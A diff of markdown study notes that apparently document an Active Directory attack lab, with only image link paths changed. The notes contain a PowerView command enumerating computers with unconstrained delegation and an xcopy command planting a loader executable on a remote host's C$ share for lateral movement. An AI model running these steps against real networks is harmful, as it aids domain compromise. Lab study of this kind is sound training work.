@@ -1,14 +1,14 @@
-![[Pasted image 20250627175853.png]]
+![[../../../attchments/Pasted image 20250627175853.png]]
 
 
 # Q1
 
-![[Pasted image 20250627180020.png]]
+![[../../../attchments/Pasted image 20250627180020.png]]
 ```
 Get-DomainComputer -Unconstrained | select -ExpandProperty samaccountname
 ```
 
-![[Pasted image 20250627180236.png]]
+![[../../../attchments/Pasted image 20250627180236.png]]
 
 ```
 C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
